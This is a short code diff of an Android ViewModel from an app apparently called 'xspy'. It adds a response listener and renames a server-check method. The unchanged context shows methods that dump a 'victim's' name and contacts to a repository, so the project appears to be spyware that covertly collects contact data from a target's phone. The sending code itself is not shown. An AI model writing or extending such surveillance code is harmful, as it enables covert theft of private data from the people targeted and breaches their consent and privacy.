@@ -5,6 +5,7 @@ import androidx.lifecycle.MutableLiveData;
 import androidx.lifecycle.ViewModel;
 
 import com.google.gson.JsonElement;
+import com.redeyesncode.xspy.base.ApiResponseListener;
 import com.redeyesncode.xspy.models.DeviceInfoBody;
 import com.redeyesncode.xspy.repo.MainRepository;
 
@@ -16,6 +17,12 @@ public class MainViewModel extends ViewModel {
     MutableLiveData<JsonElement> jsonElementMutableLiveData = new MutableLiveData<>();
     private MainRepository mainRepository;
 
+    public LiveData<JsonElement> jsonElementLiveData(){
+
+        return jsonElementMutableLiveData;
+
+    }
+
     public LiveData<String> getIsFailed() {
         return isFailed;
     }
@@ -23,6 +30,20 @@ public class MainViewModel extends ViewModel {
         return isConnecting;
     }
 
+    ApiResponseListener apiResponseListener = new ApiResponseListener() {
+        @Override
+        public void onSuccess(JsonElement jsonElement) {
+            isConnecting.postValue(false);
+            jsonElementMutableLiveData.postValue(jsonElement);
+
+        }
+
+        @Override
+        public void onError(String error) {
+            isFailed.postValue(error);
+
+        }
+    };
 
     public void init(){
         if(jsonElementMutableLiveData==null){
@@ -35,9 +56,11 @@ public class MainViewModel extends ViewModel {
         mainRepository.dumpVictimName(name);
     }
 
-    public void hello(){
-        mainRepository.checkServer();
+    public void helloServer(){
+        mainRepository.checkServer(apiResponseListener);
     }
+
+
 
     public void dumpContact(String contactNumber,String contactName){
         mainRepository.saveVictimsContact(contactName,contactNumber);
